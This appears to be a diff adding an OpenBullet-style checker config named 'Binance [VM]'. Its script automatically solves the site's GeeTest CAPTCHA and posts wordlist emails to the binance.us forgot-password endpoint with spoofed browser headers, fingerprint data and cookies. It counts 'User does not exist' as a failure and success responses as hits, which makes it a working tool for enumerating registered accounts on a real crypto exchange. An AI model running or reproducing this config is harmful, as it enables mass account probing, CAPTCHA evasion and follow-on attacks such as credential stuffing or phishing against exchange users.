@@ -1,0 +1,107 @@
+[SETTINGS]
+{
+  "Name": "Binance [VM]",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-11-16T21:57:54.4306597-03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Binance [VM]",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION DateToUnixTime "yyyy-MM-dd:HH-mm-ss" Miliseconds -> VAR "Time" 
+
+REQUEST GET "https://accounts.binance.us/gateway-api/v1/public/common/security/gt-code?t=<Time>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "challenge\":\"" "\"" -> VAR "challenge" 
+
+PARSE "<SOURCE>" LR "gt\":\"" "\"" -> VAR "gt" 
+
+SOLVECAPTCHA GeeTest "https://www.binance.us/en/user/reset-password/" "<gt>" "<challenge>" "api.geetest.com" 
+
+REQUEST POST "https://www.binance.us/gateway-api/v1/public/account/user/forgot-password" 
+  CONTENT "{\"email\":\"<USER>\",\"validateCodeType\":\"gt\",\"geetestChallenge\":\"<GT_CHALLENGE>\",\"geetestSecCode\":\"<GT_SECCODE>\",\"geetestValidate\":\"<GT_VALIDATE>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "cookie: cid=Q4oiX0k2; _ga=GA1.2.734947980.1634529515; bnc-uuid=bff4cfd7-b1f0-4b44-9e4a-76ae21286187; show_banner=1; BNC_FV_KEY_EXPIRE=1634615924201; lang=en; lang=EN; _gid=GA1.2.2085154187.1636936422; _gat=1; userPreferredCurrency=USD_USD; gtId=a364458c-85f9-45ce-8882-0f4e625aa6b0; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2217d210398af4e-0371e7b4bf43c1-561a1154-1049088-17d210398b01f4%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%7D%2C%22%24device_id%22%3A%2217d210398af4e-0371e7b4bf43c1-561a1154-1049088-17d210398b01f4%22%7D; ALLOW_ACCESS=true" 
+  HEADER "csrftoken: d41d8cd98f00b204e9800998ecf8427e" 
+  HEADER "device-info: eyJzY3JlZW5fcmVzb2x1dGlvbiI6Ijc2OCwxMzY2IiwiYXZhaWxhYmxlX3NjcmVlbl9yZXNvbHV0aW9uIjoiNzI4LDEzNjYiLCJzeXN0ZW1fdmVyc2lvbiI6IldpbmRvd3MgMTAiLCJicmFuZF9tb2RlbCI6InVua25vd24iLCJzeXN0ZW1fbGFuZyI6ImVzLTQxOSIsInRpbWV6b25lIjoiR01ULTMiLCJ0aW1lem9uZU9mZnNldCI6MTgwLCJ1c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk1LjAuNDYzOC42OSBTYWZhcmkvNTM3LjM2IEVkZy85NS4wLjEwMjAuNTMiLCJsaXN0X3BsdWdpbiI6IlBERiBWaWV3ZXIsQ2hyb21lIFBERiBWaWV3ZXIsQ2hyb21pdW0gUERGIFZpZXdlcixNaWNyb3NvZnQgRWRnZSBQREYgVmlld2VyLFdlYktpdCBidWlsdC1pbiBQREYiLCJjYW52YXNfY29kZSI6IjJmNjBlNTY0Iiwid2ViZ2xfdmVuZG9yIjoiR29vZ2xlIEluYy4gKEludGVsKSIsIndlYmdsX3JlbmRlcmVyIjoiQU5HTEUgKEludGVsLCBJbnRlbChSKSBIRCBHcmFwaGljcyA1NTAwIERpcmVjdDNEMTEgdnNfNV8wIHBzXzVfMCwgRDNEMTEtMjAuMTkuMTUuNDUzMSkiLCJhdWRpbyI6IjEyNC4wNDM0NzUyNzUxNjA3NCIsInBsYXRmb3JtIjoiV2luMzIiLCJ3ZWJfdGltZXpvbmUiOiJBbWVyaWNhL01vbnRldmlkZW8iLCJkZXZpY2VfbmFtZSI6IkVkZ2UgVjk1LjAuMTAyMC41MyAoV2luZG93cykiLCJmaW5nZXJwcmludCI6IjE4MmUyNjc5NDQ3NjQxMzEwNjBiMzc4NTJjMjQ1MzczIiwiZGV2aWNlX2lkIjoiIiwicmVsYXRlZF9kZXZpY2VfaWRzIjoiIn0=" 
+  HEADER "fvideo-id: null" 
+  HEADER "lang: en" 
+  HEADER "origin: https://www.binance.us" 
+  HEADER "referer: https://www.binance.us/en/user/reset-password/" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.53" 
+  HEADER "x-trace-id: 41eab431-fe8a-4cc2-abb8-b0f5d733066b" 
+  HEADER "x-ui-request-trace: 41eab431-fe8a-4cc2-abb8-b0f5d733066b" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "User does not exist" 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Retry OR 
+    KEY "Verify failed, please reload and try again" 
+
